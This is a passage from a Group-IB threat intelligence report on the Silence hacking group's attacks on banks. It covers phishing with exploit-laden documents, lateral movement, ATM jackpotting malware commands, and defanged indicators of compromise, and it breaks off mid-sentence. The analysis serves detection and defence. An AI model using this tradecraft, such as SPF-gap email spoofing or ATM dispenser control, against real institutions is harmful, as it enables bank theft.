{
    "title": "silence_moving-into-the-darkside",
    "text": "1\n       \n group-ib.com September 2018\nMOVING INTO THE DARKSIDESilence\nMoving into the darkside2\nTABLE OF CONTENTS\nIntroduction  4\nKey findings  5\nSilence is a new threat to banks  5\nLanguage  5\nThefts  6  \n \nGeography  6\nTools  7\nInitial steps 7\nPhishing emails  7\nServer infrastructure  8\nSilence: the development of tools and types of attacks 9\nToolbox 10\nSilence  10\nAtmosphere  13\nUndernet DDoS bot 16\nSmoke bot 17\nInfection  18\nEmails  18\nMail servers  21\nLateral movement  23\nRemote Access 25\nTargets  26\nAWS CBR  26\nATMs  28\nCard processing 303\nHunting  СHAPTER IS NOT  AVAILABLE\nMail servers  —\nC&C servers — \nTechnical description of the tools 32\nAttachments  32\nSilence Trojan  37\nSilence.Downloader  38\nPatched Kikothac 40\nSilence.MainModule  45\nSilence.SurveillanceModule  53\nSilence.ProxyBot  54\nSilence.ProxyBot.Net  57\nSilence ATM pack 60\nAtmosphere.Dropper  60\nAtmosphere.Injector  62\nAtmosphere  62\nOther programs  73\nUtilities 73\nPerl IRC DDoS bot 76\nIndicators  81\nHashes  81\nE-mails  82\nIPs 83\nDomains  85\nFile system artifacts: 86\nSuricata rules —\nYARA rules —Silence\nMoving into the darkside4\nINTRODUCTION  \nIn August 2017, the National Bank of Ukraine warned state-owned and private \nbanks across the country about a large-scale phishing attack. The threat actor \nused an exploit from the arsenal of the state-sponsored hacker group APT28. \nHowever, the tool, as Group-IB discovered, was modified to target banks. It also \nappeared that the authors of the phishing emails had in-depth knowledge of \nreverse engineering.\nAt the time, the National Bank of Ukraine linked the attack with a new wave of \nNotPetya ransomware outbreak, but these were not pro-government hackers. \nInitial impressions would indicate that the targeted attack was on par with the \nworks of Cobalt  or MoneyTaker . This hypothesis went unproven. On investigation, \nthe adversaries were a young and active hacker group, who, like young smart \ntechnical specialists, learned very fast and from their own mistakes. \nThe new threat actor group was eventually named Silence. They were identified \nand named first in reports by Anti-Virus vendors, however, until the publication \nof this report, no detailed technical analysis of Silence or their operations has \nbeen conducted. \nFinancially motivated APT groups which focus efforts on targeted attacks on the \nfinancial sector such as — Anunak, Corkow, Buhtrap — usually managed botnets \nusing developed or modified banking Trojans. Silence is different. Even at the \nbeginning of their journey, in the summer of 2016, Silence was not able to hack \nbanking systems and actually seemed to learn on the job by carefully analyzing \nthe experiences, tactics and the tools of other groups. They tried new techniques \nto steal from banking systems, including AWS CBR (the Russian Central Bank’s \nAutomated Workstation Client), ATMs, and card processing.\nThis report details the results of our investigation, review of attacks and thefts \nby Silence, analysis of their tools, tactics and procedures used to target financial \ninstitutions. This report serves as a contribution to the Whitehat Security \ncommunity from Group-IB and provides technical descriptions of the methods \nand technologies that can be used to detect and track this group. We have \nalso included a detailed analysis of the toolset created by Silence indicators of \ncompromise and other data for successful detection of Silence's attacks.SILENCE is a new and active criminal APT-group , who adapt \nquickly from their own mistakes and adopt TTPs of other \ngroups.Silence\nMoving into the darkside5\nKEY FINDINGS\nSilence is a new threat to banks \nGroup-IB detected the first incidents relating to Silence in June 2016. At that time, \nthe cyber criminals were just beginning to test their capabilities. One of Silence’s \nfirst targets was a Russian bank, when they tried to attack AWS CBR. After this, the \nhackers \"took a moment of silence\". It was later discovered that this is standard \npractice for Silence. They are selective in their attacks and wait for about three \nmonths between incidents, which is approximately three times longer than other \nfinancially motivated APT groups, like MoneyTaker, Anunak (Carbanak), Buhtrap or \nCobalt.\nSilence members constantly analyze the experience of other criminal groups. They \ntry to apply new techniques and ways of stealing from various banking systems, \nincluding AWS CBR, ATMs, and card processing. In a short period of time they \nstudied not only direct types of hacking, but also supply-chain attacks. In less \nthan a year, the amount of funds stolen by Silence has increased five times.\nLanguage\nAs with most financially-motivated APT groups, the members of Silence are \nRussian speakers, which is evidenced by the language of commands, priorities in \nlocating leased infrastructure, the choice of Russian-speaking hosting providers \nand location of the targets.\n• The commands of Silence’s  Trojan are Russian words typed using an English \nlayout:\nhtrjyytrn > реконнект (reconnect)\nhtcnfhn > рестарт (restart)\nytnpflfybq > нетзадач (notasks)\n• The main targets are located in Russia, although phishing emails were sent to \nbank employees in more than 25 countries of Central and Western Europe, Africa \nand Asia.\n• To rent servers, Silence uses Russian-speaking hosting providers.6\nThefts  \n \nTimeline of attacks\nJuly 2016 — A failed attempt to withdraw money via the Russian system of \ninterbank transactions AWS CBR. Hackers gained access to the system, but the \nattack wasn’t successful due to improper preparation of the payment order. The \nbank’s employees suspended the transaction and conducted Incident Response \nand remediation using their own resources. This resulted in the subsequent \nincident described below:\nAugust 2016 — Another attempt to attack the same bank. Just one month (!) after \ntheir failure with AWS CBR, Silence regained access to the servers of the bank \nand attempted another attack. To do this, they downloaded software to secretly \ntake screenshots and proceeded to investigate the operator’s work via video \nstream. This time, the bank asked Group-IB to respond to the incident. The attack \nwas stopped. However, the full log of the incident was unrecoverable, because in \nan attempt to clean the network, the bank’s IT team deleted the majority of the \nattacker’s traces.\nOctober 2017 — The first successful theft by the group that we know about. This \ntime, Silence attacked ATMs and stole over $100,000  in just one night. In the same \nyear, they conducted DDoS attacks using the Perl IRC bot and public IRC chats to \ncontrol Trojans.\nAfter the failed attempt with the interbank transactions system in 2016, the \ncriminals did not try to withdraw money using the system, even after gaining \naccess to the servers of AWS CBR.\nFebruary 2018 — Successful attack using card processing. They picked up over \n$550,000  via ATMs of the bank’s counterpart.\nApril 2018 — In two months, the group returned to their proven method and \nwithdrew funds again through ATMs. During a single night they siphoned about \n$150,000 . This time, the Silence’s tools had been significantly modified: they were \nnot burdened with redundant features and ran stably without bugs.\nGeography\nSilence’s successful attacks currently have been limited to the CIS and Eastern \nEuropean countries. Their main targets are located in Russia, Ukraine, Belarus, \nAzerbaijan, Poland, and Kazakhstan.\nHowever, some phishing emails were sent to bank employees in more than 25 \ncountries of Central and Western Europe, Africa and Asia including: Kyrgyzstan, \nArmenia, Georgia, Serbia, Germany, Latvia, Czech Republic, Romania, Kenya, Israel, \nCyprus, Greece, Turkey, Taiwan, Malaysia, Switzerland, Vietnam, Austria, Uzbekistan, \nGreat Britain, Hong Kong, and others.2302\n96\n67\n28\n17\n10\n8\n8RU\nCOM\nOTHERS\nUA\nBY\nPL\nORG\nKZ7\nTOOLS\nInitial steps\nAccording to Group-IB’s Forensics Laboratory, during the the first attacks Silence \nused third-party tools and learned on the go. However, after some time they \nswitched from using third-party tools to developing their own and significantly \nimproved their tactics.\nDuring the first operations the cybercriminals used a third-party patched \nbackdoor Kikothac  without access to its source code. They chose a Trojan, which \nhad been known since November 2015, and did not require a lot of time for \nreverse engineering and back end implementation.\nThe usage of this disassembled backdoor indicates that the group started without \npreparation and the first operation was a mere attempt to test their capabilities.\n \nDevelopment of new tools\nLater, the criminals developed a unique set of tools to attack card processing and \nATMs. It included self-developed software :\n• Silence is a framework for attacks on infrastructure.\n• Atmosphere  is a set of software for ‘jackpotting’ ATMs.\n• Farse  is a utility for getting passwords from an infected computer.\n• Cleaner  is a tool for deleting logs of the remote connection.\nBorrowed tools:\n•  Smoke bot is a bot for conducting the first phase of infection.\n• Modified Perl IRC DDoS is a bot based on the Undernet DDoS bot for \nconducting DDoS attacks.\nPhishing emails\nAt the beginning, the group used hacked servers and compromised accounts for \ncampaigns, but later the criminals began to register phishing domains and create \nself-signed certificates.\nTo evade content filtering systems they used DKIM and SPF. To create ‘legitimate’ \nemails purporting to be from the banks, the hackers used the banks’ domains that \ndid not have configured SPF records. The letters were sent from rented servers \nwith substituted technical headers. The attackers created lengthy and logical \ntexts and sent these with the names of bank employees to increase the success \nrate.Silence\nMoving into the darkside8\nThe emails contained decoy Microsoft Office Word documents weaponized with \nexploits for the CVE-2017-0199, CVE-2017-11882+CVE-2018-0802, CVE-2017-0262, \nand CVE-2018-8174  vulnerabilities. Apart from the exploits, there were emails \nwith attached CHM files, which is not common, and .LNK shortcuts launching \nPowerShell and JavaScript code\nRemote control and persistence\nThe Operator usually conducts the attack using a Linux machine with the WinExe \nutility (the equivalent of PSExec under Linux), which can launch software on the \nremote Windows node via SMB protocol.\nAfter it is established on the system, the Silence Trojan installs Meterpreter \nstager. To gain access to compromised computers, the cybercriminals use \nRAdmin . It is software used by many administrators in banks to remotely control \nworkstations.\nServer infrastructure\nThe servers rented by the attackers to conduct phishing attacks are located in \nRussia and the Netherlands . For the C&C servers, they use a Ukrainian hosting \nprovider that allows placement of practically any content, including banned \ninformation, malicious software and files. Silence rented several servers at \nMaxiDed, whose infrastructure was banned by Interpol in May 2018.9\nJUN 2016\nUnsuccessful ARM\nCBR attack\nSEP 2016\nSilence.\nDownloaderOCT 2017\nAtmosphere\nAtmosphere.Injector\nAtmosphere.Dropper\nAPR 2018\nATM attackJUL 2016\nSilence.\nProxyBot\nJUL 2016\nSilence.\nShadowingModuleAUG 2016\nSilence.\nProxyBotJUN 2017\nSilence.\nMainModuleJAN 2018\nSilence\nProxyBot.NetNOV 2016\nSilence.\nMainModuleAUG 2017\nSilence.Downloader\nSilence.MainModuleMAR 2018\nSilence.\nProxyBotOCT 2017\nSilence.\nProxyBotMAR 2017\nSilence.\nProxyBot.NetNOV 2017\nATM attackFEB 2018\nCard Processing attack\nJUL 2017\nSilence.\nMainModule\nAPR 2018\nAtmosphere\nAtmosphere.Dropper\nSilence.DownloaderSilence: \nthe development of tools and types of attacksSilence\nMoving into the darkside10\nTOOLBOX\nAn important feature of Silence group is the use of their unique self-developed \ntools. Such tools include: \n• Silence , a framework which the group is named after;\n• Atmosphere pack , a unique set for attacking ATMs;\n• Farse , a utility for getting passwords from the infected computer;\n• Cleaner , a tool for deleting logs of the remote connection.\nSilence\nThe unique Silence framework used by the group is modular. It consists of the \nfollowing components (discovered by us; there could be more):\n• Silence.Downloader  loader;\n•  Main module called Silence and a patched backdoor called Kikothac ;\n• Silence.SurveillanceModule , a module for spying on users;\n• Silence.ProxyBot  proxy.\nThe main module can load any other executable file, which does not limit the \nsystem’s functionality and gives room to extend features.\nAfter the attached exploit, disguised as an MS Office document, is opened the \nSilence.Downloader  loader for the Trojan is downloaded and installed. The loader \nadds itself to startup and waits for the command to download and launch the \nnext stage. If the server is of no interest to the attacker, the bot executes a self-\ndestruct command.\nDownload & Execute\nShell commandCommand request\nResultsRegistration\nUsers Silence C&CEmail with exploit\nor scriptSilence.\nDownloaderSilence or patched \nKikothacMeterpreterSilence.SurveillanceModule\nSilence.ProxyBot11\nThe main body of the Silence Trojan also adds itself to startup after the launch. \nThen it registers on the server and enters command reception/execution loop. \nThe main task of the Trojan is to execute remote commands in the command \ninterpreter as well as download and launch arbitrary programs.\nBelow is a table of C&C commands that the malware executes:  \n \nCommand Type of command \n/ Russian textFunction\nhtrjyytrn reconnect\nреконнектTerminate the command interpreter \nsession, clear all temporary files, connect to \nC&C \"from scratch\"\nhtcnfhn restart\nрестартTerminate the command interpreter session \nand restart it\nytnpflfybq notasks\nнетзадачNo operation \n#wget wget Download a file from a remote server and \nsave it in the current directory. Accepts two \nparameters: URL and file name\nshell\\n shell Launch the command interpreter\n\\n<any other \nstring>run Execute an arbitrary OS command using the \ncommand interpreter\nTo enter standalone segments of a corporate network, Silence downloads \nthe ProxyBot module. The purpose of this software is to redirect, through an Silence.\nDownloader\nSilence\nMainModuleSilence.\nProxyBotSilence\nSurveilanceModulehtrjyytrn\nhtcn/f_hn\nytnpﬂfybq#wget\nshell\\n\n\\n<any other string>Silence\nMoving into the darkside12\ninfected computer, traffic from the external C&C server to the local nodes of the \ncompromised network, which are not accessible from outside. We discovered two \nversions of the program: one in Delphi and one in C#.\nTo monitor legitimate activity of the victim bank’s users and financial operators, \nthe attackers installed SurveillanceModule , which secretly took screenshots to \ncombine them into a pseudo stream. \nAt the last stage of the attack, the bot installed Meterpreter  stager into the \nsystem, which automates navigation inside the network.\nHaving analyzed the C&C servers we also discovered Kikothac  backdoor, which \nwas communicating with one of the Silence servers, 46.183.221[.]89 . At first, we \nthought that the software was not connected to Silence’s activity, but the time of \nuploading to the public sandbox HybridAnalysis corresponded with the time of the \nSilence attack. Moreover, the Kikothac sample was uploaded with the same name \nas the Silence  Trojan on VirusTotal :\nIP IP\n## #\nnetsrvc32.exe\npatched Kikothac\napcs.exeUploded on Hybrid 2016-07-08\npatched Kikothac ProxyBot\nKikothac uploaded\nto VT on 2016-08-09Proxybot\nJuly 15th 2016Proxied request\nAnswerCommand\nReturns resultsRequest command\nUsers ProxyBot C&C13\nThrough in-depth analysis, we discovered that the reference to the original \naddress of the C&C server was gone, and the code responsible for connecting to \nthe server, uses the reference to the address which was written over statically-\nlinked code generated by the compiler:\nIn addition, all Kikothac commands begin with the # character, including the \ncommand for downloading files from web servers, #wget. The same command is \nimplemented in the Silence Trojan. This is the only command there that starts with \nthe # character. Any other string not included in the list of Kikothac  commands, \nis automatically sent to the command interpreter cmd.exe for execution. Silence \ndoes the very same thing. For example, let’s look at two Kikothac commands \nbelow. The full list of commands is quite long and is provided in the Technical \nDescription of the Tools section:  \nCommand Function\n#wget Download the file to an infected device. Bot accepts two \nparameters: URL and file name. \nAny other string Send the string to cmd.exe.\nAs we can see, both commands are used in the Silence Trojan. They duplicate the \norder, the type of arguments, and the logic. This suggests that to control patched \nKikothac , the threat actors developed back end, which was later used for the \nSilence Trojan. \nAtmosphere\nTo control the ATM dispenser, Silence uses a unique software called Atmosphere . \nOver time the Trojan has significantly evolved to address the needs of the \ncriminals. For example, the developers have changed the logic of injection into \nprocesses and added the flexible injector, which has expanded the list of targeted \nATMs. They have also removed the redundant features that interrupted the \noperation or were not used by the criminals. For example, the last version of the \nsoftware didn’t process commands from the PIN pad and the generated log got \nsmaller. In the initial stages, the software was recompiled a lot, which resulted in \nseveral unsuccessful cashout attempts.Silence\nMoving into the darkside14\nThe hackers remotely install Atmosphere.Dropper on the ATM. The software \ncontains a .DLL library, which is the main body of the Atmosphere  Trojan. After \nthe body is extracted, the dropper injects the library into the fwmain32.exe \nprocess. This enables the threat actor to remotely control the dispenser. In the \nfirst versions, there was a way to control the dispenser using the PIN pad, but later \nthese features were deleted.\nCommand Function\n\"B\" Get information on the content of ATM cassettes. In addition, the \nstring \"cash units info received\" is added into the log.\n\"A\" Get information on the content of ATM cassettes without logging. \n\"Q\" Get information on the content of ATM cassettes.\n\"D\" One-time withdrawal of notes of the specific face value from the \nATM.\n\"H\" Suspend all threads in process except its own. Then use functions \nGetThreadContext + SetThreadContext to redirect their execution \nto its own function.\n\"M\", \"R\", \n\"S\", \"P\", \n\"T\", \"L\"Record the output of the last command into the C:\\intel\\<chrs>.007 \nfile. This command is also executed after any other by default.Dropper\nExtracts\nInjects into hardcoded\ninto speciﬁed Injects givenInjector Atmosphere Dispenser’s process15\nThe program receives commands via files with the specific extension. The \nsoftware reads commands, executes them, and then, as the author intended, \nit should overwrite the file with gibberish and delete it to hamper the work for \nforensics experts. However, the software logic contains an error, which results in \nthe nonsensical text being written at the end of the file instead of over everything.\nThis mistake is present in other software used by Silence, which supports the \nhypothesis of a single author. For example, the same piece of code is used in the \nprogram for clearing the connection logs of RAdmin .\nAs part of incident response activities in one of the banks, Group-IB forensic \nspecialists discovered about 11 samples of Atmosphere  software, compiled at \ndifferent times with slight changes. In one of the directories containing the Trojan \nwe also discovered scripts for the command interpreter and a separate injector, \nwhich accepted a path to the DLL library as an argument, and an identifier of the \nprocess where it should inject the library. However, the scripts passed the target \nprocess name instead of the process identifier, which resulted in an unsuccessful \nattempt to take control over the dispenser.Silence\nMoving into the darkside16\nUndernet DDoS bot\nWhile analyzing one of the servers of Silence , we discovered a DDoS bot called \nPerl IrcBot . On April 20, 2017, phishing emails were sent from the driley123@\nbellsouth[.]net address. The emails contained an exploit, which downloaded \nSilence.Downloader with the address of C&C server, 92.222.68[.]32,  on a machine. \nPerl IrcBot for DDoS attacks was available at hxxp:/ /92.222.68[.]32/bot.pl and \nhxxp://92.222.68[.]32/wolf/  until June 18, 2018. \nThe program was first mentioned on a Spanish forum in messages dated 2014: \nhxxps://forum.voidsec [.]com/thread-93.html . There are also modifications of \nthe bot available online at: hxxps:/ /github [.]com/H1R0GH057/Anonymous/blob/\nmaster/ircabuse.pl  and hxxps:/ /gist.github [.]com/dreadpiratesr/7bccc6eed4\n9150a8564a . The version used by Silence  is based on the Undernet DDoS Bot  \n(second link), according to the unique string \"PRIVMSG :  4,1 [Help]   9,1 Undernet \nPerlBot Main Help:\".\nThis software is controlled using IRC messages. There were two servers used:\n1. ira.pubcs16[.]ro, which is a public server of Counter-Strike players via #test \nchannel. Later they used #PMA channel;\n2. piratesofcyber[.]tk. IPhttp\nhttp #DNS\nhttp #DNSDNS\n##2017-04-20\n081ee959cbe6bc7dde7a6d13168e4fb4\nShell\nuploaded to vt on 2017-09-17Shell\nuploaded to vt on 2017-09-17Silen/uni0441e.Downloader\ncompiled on 2017-04-19\nIR/uni0421 DDoS bot\nDDoS Perl IrcBotV1.0\nSpanish v ars17\nSmoke Bot\nOne of the English-language emails sent in 2017 contained a JavaScript loader \nwhich installed Smoke Bot into the system. Smoke Bot was put up for sale on \nunderground forums in 2011. The seller is a Russian-speaking hacker named \nSmokeLdr. Apart from downloading and execution of arbitrary files, Smoke Bot has \nthe following features:\n• collection of credentials from browsers, mail programs and other software;\n• collection of email addresses from saved email accounts;\n• interception of data input into browser;\n• interception of email and FTP passwords in real time;\n• ability to collect files with specific criteria;\n• DDoS module;\n• TeamViewer module;\n• cryptocurrency mining module.Silence\nMoving into the darkside18\nINFECTION\nEmails\nThe infection vector used by Silence is typical: phishing emails with attachments \ncontaining exploits or malicious scripts. The senders masquerade as bank \nemployees, and while the email lacks design elements (pictures, HTML layout), the \ntext is logical and inspires trust. Unlike, for example, Cobalt phishing emails that \nare created carelessly and rely on their mass nature, Silence emails are tidy and \ntargeted.\nFor example, on August 18, 2017, the Central Bank of Ukraine notified \nfinancial institutions about an upcoming ransomware attack (https:/ /www.\nbankinfosecurity.com/ukraine-central-bank-detects-massive-attack-\npreparation-a-10209 ). We believe that the message was the result of a phishing \ncampaign by Silence against the banks in Ukraine, Kazakhstan, and Russia. \nA unique feature of the campaign is the use of an exploit for the CVE-2017-0262  \nvulnerability. The exploit is believed to be owned by the state-sponsored hacker \ngroup APT28. To conduct the campaign, the hackers used a compromised server.\nOn May 9, 2017, ESET published a report on the tools of the APT28 group (h t t p s ://\nwww.welivesecurity.com/2017/05/09/sednit-adds-two-zero-day-exploits-using-\ntrumps-attack-syria-decoy/ ). The approach to infecting a system and capabilities \nof attachment from the Silence email correspond to the published report. \nHowever, we discovered the modification of the exploit at the level of assembler \ninstructions or so-called byte patching:\n19\nThis means that the author didn’t have the source code or the builder, so he had \nto use a fixed jump address. Therefore, the author had to write the payload to the \nfixed address. It is worth noting that to implement such modification one needs \nquite advanced expertise in reverse engineering.\nLater, there was a campaign with the CHM file. This is a file extension for compiling \nWindows reference tools. On October 13, 2017, the attackers used names of several \nRussian banks to send phishing emails. One of the emails purported to be from \nthe Russian bank Fin Service. For this attack, the criminals registered a domain, \nfcbank[.]ru\nSilence\nMoving into the darkside20\nThis format allows criminals to enable JavaScripts and execute remote VB and/or \nPowershell code by calling mshta.exe or powershell.exe.\nAlthough the vector is not new and was used even back in 2015 to deliver malware, \nthe use of CHM files is not at all typical for attacks on the CIS and, in some cases, \nhelps to evade discovery and successfully get through corporate security systems.\nOne of the emails was sent to CERT-GIB (Group-IB’s Computer Emergency \nResponse Team):\nThe attachment contained an archive with a .LNK shortcut, generated in such way \nthat when opened it launched the Powershell, which downloaded and launched \nSilence.Downloader . The result of launching the attachment from the Silence \nemail is the installation of Silence.Downloader  on the victim’s computer.\nOne of the emails in English contained a JavaScript. The letter purported to be \nfrom Royal Bank of Scotland (stated in footer) with the sender \"HBCL inc\" <info@\nfinamnews019[.]xyz>:\nAfter opening the JavaScript the computer downloaded and launched Smoke \nBot from the address 91.207.7[.]79, which is a C&C server of Silence . Smoke Bot \ndownloaded additional modules from the cassocial[.]gdn  and variiform[.]gdn  \ndomains. The former domain resolved to 91.207.7[.]97 . This server, 91.207.7[.]97 , \nwas used by Silence to download Silence.Downloader  in the email with .LNK.\n21\nMail Servers\nTo send malicious emails, the group utilizes hacked servers and registers \n\"banking\" domains. They also use public mail services, like mail.com  and att.net .\nIf a bank whose name is used for a campaign, didn’t have correctly configured SPF \nrecords, attackers used a hacked or rented a server to send emails with replaced \nheaders. For example, the following servers were used to send emails with the \nnames of banks without configured SPF:\nIP Real Bank Service \nProviderCountry Date\n5.200.55[.]198  bankrab.ru OOO IT-Grad Russia 07-2016\n185.7.30[.]137 itbank.ru VMLAB \nLLC VPS \nCustomersRussia 06-2017\nWhen registering new domains for a server from which the emails will be sent, the \nself-signed certificate is released. For more details, please refer to the Hunting \nsection. This way, the email passes the DKIM check. The following domain names \nwere registered using this method:  \nDomain IP Service \nProviderCountry Date\ntrustintbank[.]org 109.234.34[.]35  VDSINA VDS \nHostingRussia 2016-07\nitbank[.]us 193.0.178[.]12  PE Viktor Tyurin Netherlands 2016-07\nitrbank[.]ru 31.31.204[.]161 Reg.Ru Russia 2016-09\nitmbank[.]ru 185.100.67[.]129  Hoster.KZ Kazakhstan 2016-09\nitmbank[.]us 46.30.43[.]83  Eurobyte VPS Russia 2016-09\nmosfinbank[.]ru 5.200.56[.]161  OOO IT-Grad 2016-09\nmostbbank[.]ru 31.31.204[.]161 Reg.Ru Russia 2016-09\n77.246.145[.]86 E-PLANET Russia 2017-06\n77.246.145[.]82 2017-06\nppfbank[.]ru 185.158.154[.]147  IT-GRAD 1Cloud \nLLCRussia 2017-06\nfbank[.]org 185.158.154[.]17  IT-GRAD 1Cloud \nLLCRussia 2017-06\n185.154.53[.]132  2017-06\ndgbank[.]ru 158.255.0[.]35 Mir Telematiki \nLtdRussia 2017-09Silence\nMoving into the darkside22\nbankci[.]ru 95.142.39[.]5 Eurobyte VDS Russia 2017-09\n95.142.39[.]6 Eurobyte VDS Russia 2017-09\ncsbank[.]ru 185.180.231[.]63 FirstByte Russia 2017-09\nfcbank[.]ru 195.161.41[.]2  Avguro \nTechnologies \nLtd. Hosting \nservice \nproviderRussia 2017-09\n81.177.135[.]99   2017-10\nmmibank[.]ru 81.177.140[.]58 Avguro \nTechnologies \nLtd. Hosting \nservice \nproviderRussia 2017-09\n81.177.6[.]226 2017-10\nspas-\nibosberbank[.]ru185.235.130[.]69  ON-LINE DATA \nLTDNetherlands 2018-01\nfpbank[.]ru 217.28.213[.]250 INTRELL-NE T Russia 2018-05\n217.28.213[.]162  2018-05\n217.29.57[.]176  2018-05\nHacked servers used for sending emails:  \nDomain Date\ntvaudio[.]ru 07-2016\nvivacity[.]ru 08-2017\nfinamnews019[.]xyz 10-201723\nLATERAL MOVEMENT\nApart from malware, Silence uses some well-known legitimate utilities to \ncomplete the tasks. For example, to access compromised computers, the group \nuses winexe , which is a Linux utility for remote control of Windows-based \nmachines via SMB protocol. Winexe is an open source project, which is available at \nhttps:/ /sourceforge.net/projects/winexe/ .\nTo access the machine on Windows with SMB, several conditions must be met:\n• active Server Message Block (SMB) service, which is not blocked by firewall;\n• active File and Print Sharing service;\n• disabled Simple File Sharing service;\n• available Admin$ network resource (hidden SMB object).\nTo access Admin$ resource, which is used to launch programs, the program has \nto have credentials: login and password. Upon successful access to the target \nmachine, the c:\\Windows\\winexesvc.exe program is created and launched on the \nserver using Winexe.\nAfter gaining remote control of the target machine, hackers use Mimikatz-\nbased software and Meterpreter capabilities to download data on user and \nadministrator accounts from the domain.\nTo get the computer administrator privileges, LPE exploits are required.\nIt was confirmed that they used standalone LPE exploits: CVE-2008-4250 , CVE-\n2017-0143 , and CVE-2017-0263 . Other samples were not recoverable. The group \nalso uses all LPE exploits provided by the Metasploit framework.\nTo retrieve passwords from RAM, the group used the Farse 6.1 utility, which \nis based on the source code of Mimikatz (hxxps:/ /github[.]com/gentilkiwi/\nmimikatz ). Farse is just an add-on for Mimikatz, which, when launched, extracts \ncredentials from lsass.exe and prints them to the standard output. In other \nwords, it is software which automates your work with Mimikatz.\nSilence\nMoving into the darkside24\nFarse  is developed by Silence. For detailed technical analysis, please refer to the \nTechnical Description of the Tools section.\nHackers used NMAP  to scan the corporate network. The tool enabled them to \nbuild network topology and identify vulnerable hosts, which they used to gain \naccess to other machines and administrator accounts.\nTo delete RAdmin  logs, the group used self-developed software called Cleaner , \nwhich overwrites gibberish in the specified file. The software contains a logical \nerror and the data is added to the end of the document, not overwritten from the \nbeginning. The implementation is copied from Atmosphere .\n25\nProxied request\nAnswerCommand\nReturns resultsRequest command\nUsers ProxyBot C&CREMOTE ACCESS\nAfter gaining control over the machine (using privilege escalation or a domain \nadministrator account), to further control it, hackers install a remote control tool \ncalled RAdmin. The software is modified in such a way that it works hidden from \nthe user.\nAt the same time, together with RAdmin  hackers use standard access via RDP . \nTo do so, they patch termsrv.dll. In some cases Silence uses access via WEB RDP \n(which is a standard Windows service) using HTTPS protocol.\nTo access the nodes in an internal corporate network that cannot be accessed \nfrom the outside,  Silence uses unique software, which allows proxying traffic \nwith backconnect. The first software was written in Delphi. It is classified as \nSilence.ProxyBot . For a detailed description, please refer to the Technical \nDescription of the Tools section. After a while, Silence migrated to the version \nof the software for .NET. called Silence.ProxyBot.NET .\nThus, any computer becomes a proxy with backconnect and intermediate node for \naccessing critical servers in the network.\n After thorough investigation of the protocol for interaction with the backconnect \nserver, we have developed a software for detecting Silence servers. This data was \nused to detect the infrastructure of the criminal group. The algorithm is described \nin the Hunting section.Silence\nMoving into the darkside26\nTARGETS\nThe first incident related to Silence that we know about happened in July 2016 . \nHackers tried to withdraw money by manually creating a payment order in the \nsystem of interbank transactions, AWS CBR . However, the payment order was \ncreated incorrectly. The bank’s employees discovered suspicious activity on time \nand took countermeasures using their own resources. \nDespite the reaction of the security team and a failed first attempt, the hackers \nrecovered access to the servers of this bank and took a second shot in August \n2016. For this, they downloaded software for secretly taking screenshots and \nproceeded to investigate the operator’s work via a pseudo-video stream.\nIn 2017 , Silence began to attack ATMs, and this was the first known case of \nsuccessful money withdrawal. Over one night, the ATMs of one bank spat out over \n$100,000 . In the same year, they conducted DDoS attacks using the Perl IRC bot  \nand public IRC chats to control Trojans.\nIn 2018 , hackers attacked via card processing. They successfully withdrew over \n$550,000  in one weekend through the ATMs of the bank’s partner. \nIn April 2018, the group returned to the proven method and withdrew funds again \nthrough ATMs. During a single night they siphoned about $150,000 . \nAWS CBR\nAt the moment of the Incident Response to the first attack in 2016, the shared \ndirectory, where payment batches for AWS CBR were uploaded, was accessible \nfrom workstations of 2 employees. They worked with correspondent accounts, \nso these were the server with the above-mentioned directory and the terminal \nserver. Below is a chain of events that we have built through incident response. \nOn 13.06.2016,  the hackers used an administrator account and domain controller \nto install winexesvc service. This service was launched as an OS service from the \nC:\\Windows\\winexesvc.exe file. This service allows remote execution of commands \nlaunched in GNU/Linux systems on computers with Windows using SMB protocol. \nPresumably, the account was compromised using Mimikatz program or its variant, \nalthough there were no signs of its operation.\nOn 06.07.07.2016 , the criminals attempted to steal money from AWS CBR of \nthe bank. Group-IB experts believe that the attackers experienced a machine \nerror during the processing of a payment batch in AWS CBR with the purpose of \nspoofing the payment details. After this, the bank’s security team tried to stop \nthe second intrusion of the attackers. Despite their attempts, on 19.07.2016 , the \nwinexesvc service was repeatedly installed on the servers and workstations. This \ntime, the criminals used a system administrator account.\nOn 30.07.2016 , the remote control software RAdmin was installed on the server \nwith a directory. The software worked covertly in the svchost.exe file. This 27\nsoftware allowed the attacker to have round-the-clock access to the bank’s \nnetwork, because the server was virtual and worked 24\\7.\nOn 01.08.2016 , the hackers installed the patched backdoor Kikothac , netsrvc32.\nexe, on one of the employee’s computers. This software allowed execution of files \nand commands, received from the C&C server with the following IP: 193.169.245[.]89.\nOn 02.08.2016 , a piece of software, svchost.exe or RAdmin , was installed on this \nvery PC. The software was not detected by the installed anti-malware solution \nused in the bank. Then, the file for reconciliation of payments (downloaded from \nthe automated banking system with the payments that were to be uploaded \nto AWS CBR) was changed (compromised). AWS CBR was installed by the bank’s \nsecurity team to fight theft.\nIn addition, the computer was found to contain mss.exe, which is a  \nSilence.SurveillanceModule , which spies on the user’s desktop. This way, the \nattackers tried to find out how an operator works to fix their mistakes and \nconduct a fraudulent transaction.\nThis theft was prevented because the bank decided to engage Group-IB \ninformation security and incident response experts. Unfortunately, we did not \nmanage to restore the full course of events, because in an attempt to clean the \nnetwork, the bank’s IT team deleted the majority of the attacker’s traces.Silence\nMoving into the darkside28\nATMs\nSilence.DownloaderMalicious.docOR\nMalicious.chm\nC&C Server\nSilence\nMainModuleSilence\nSurveilanceModuleProxy\nBot\ndispense\ncommandAtmosphere\n.dllAtmosphere\nInjectorAtmosphere\nDropperRADMIN\nMuleMoneyMalicious.js Malicious.lnk\nATM\nOn 10.08.2017 , the bank employee received an email to their corporate mailbox \nfrom josueruvalcaba@mail[.]com  with the following subject: \"Message has been \ndisinfected : Double Spending With A Card\". The email contained an attachment \ncalled \"Account Statement.docx\". After opening the attachment, an EPS script was \nlaunched, which exploited two Microsoft Word vulnerabilities, CVE-2017-0262  and \nCVE-2017-0263 . This allowed the attackers to create a backdoor in the system and 29\nescalate privileges. The employee opened the attachment and despite the anti-\nmalware solution giving a notification of the successful deletion of malicious files, \nthe Silence loader was launched.\nOn 11.08.2017 , this workstation was used to scan a local network using Nmap . As \na result, the hackers found vulnerabilities in workstations. The attackers found \nWindows-based nodes which were vulnerable to CVE-2008-4250 . The vulnerability \naffects such operating systems as Microsoft Windows 2000 SP4, XP SP2 and SP3, \nServer 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta. These \nversions of Windows contain a vulnerability in the server service which allows \nremote code execution. It is caused by incorrect processing of the specially \ncreated RPC requests. With this 